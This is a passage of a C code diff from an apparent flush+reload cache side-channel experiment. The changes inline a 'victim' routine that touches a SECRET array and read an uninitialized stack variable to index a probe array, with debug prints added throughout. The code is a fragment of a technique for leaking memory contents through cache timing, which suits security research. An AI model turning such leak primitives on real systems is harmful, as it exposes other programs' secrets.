@@ -21,16 +21,16 @@ cp_t* flush_reload_arr;
 
 void init_func(int val) {
     volatile char x = val;
-    printf("%d\n",x);
+    printf("init  \t%p:\t%d\n", &x, x);
 }
 
 void uninit_func() {
     volatile char x;
     volatile cp_t cp = flush_reload_arr[x];
-    printf("%d\n",x);
+    printf("uninit\t%p:\t%d\n", &x, x);
 }
 
-void victim_func() {
+static inline void victim_func() {
     int val = 5;
 
     flush((void*)&val);
@@ -42,6 +42,7 @@ void victim_func() {
 
 void touch_secret(int secret_index) {
     volatile char s = SECRET[secret_index];
+    printf("secret\t%p:\t%d\n", &s, s);
 }
 
 int* prepare(int secret_index) {
@@ -50,10 +51,39 @@ int* prepare(int secret_index) {
     flush_arr((void*)flush_reload_arr, N_PAGES);
     cpuid();
 
-    touch_secret(secret_index);
+    //NO IDEA WHY I NEED THIS
+    int n_accesses = 1;
+    char secret_indices[n_accesses];
+    //END OF WEIRD SECTION
+
+    //TOUCH SECRET START
+    //touch_secret(secret_index);
+    if(secret_index <= SECRET_SIZE) {   //IF TRUE
+        volatile char s = SECRET[secret_index];
+        printf("secret\t%p:\t%d\n", &s, s);
+    }
+ 
+    //TOUCH SECRET END
     cpuid();
 
-    victim_func();
+    //VICTIM FUNC START
+    int val = 5;
+
+    flush((void*)&val);
+    cpuid();
+    if(secret_index <= SECRET_SIZE) {   //IF TRUE
+        //init_func(val);
+        volatile char x = val;
+        printf("init  \t%p:\t%d\n", &x, x);
+    }
+    if(secret_index <= SECRET_SIZE) {   //IF TRUE
+        //uninit_func();
+        volatile char x;
+        volatile cp_t cp = flush_reload_arr[x];
+        printf("uninit\t%p:\t%d\n", &x, x);
+    }
+    
+    //VICTIM FUNC END
     cpuid();
 
     //time loading duration per array index
